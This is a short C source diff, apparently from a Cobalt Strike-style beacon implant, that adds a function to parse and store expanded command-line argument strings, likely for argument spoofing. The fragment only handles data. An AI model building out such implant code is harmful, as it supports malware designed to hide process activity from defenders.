@@ -3,6 +3,7 @@
 #include "argument.h"
 
 #include "beacon.h"
+#include "utils.h"
 
 typedef struct _ARGUMENT_ENTRY
 {
@@ -55,4 +56,30 @@ ARGUMENT_ENTRY* ArgumentFindOrCreate(char* expanded)
 	}
 
 	return argument;
+}
+
+void ArgumentAdd(char* buffer, int length)
+{
+#define MAX_ORIGINAL 0x2000
+#define MAX_EXPANDED 0x2000
+#define MAX_EXPANDED_FULL 0x2000
+	datap* locals = BeaconDataAlloc(MAX_ORIGINAL + MAX_EXPANDED + MAX_EXPANDED_FULL);
+
+	char* original = BeaconDataPtr(locals, MAX_ORIGINAL);
+	char* expanded = BeaconDataPtr(locals, MAX_EXPANDED);
+	char* expandedFull = BeaconDataPtr(locals, MAX_EXPANDED_FULL);
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	BeaconDataStringCopySafe(&parser, original, MAX_ORIGINAL);
+	ExpandEnvironmentStrings_s(original, expanded, MAX_EXPANDED);
+	BeaconDataStringCopySafe(&parser, expandedFull, MAX_EXPANDED_FULL);
+
+	ARGUMENT_ENTRY* argument = ArgumentFindOrCreate(expanded);
+	argument->isActive = TRUE;
+
+	ExpandEnvironmentStrings_s(original, argument->expandedCmd, MAX_EXPANDED);
+	ExpandEnvironmentStrings_s(expandedFull, argument->expandedFullCmd, MAX_EXPANDED_FULL);
+
+	BeaconDataFree(locals);
 }
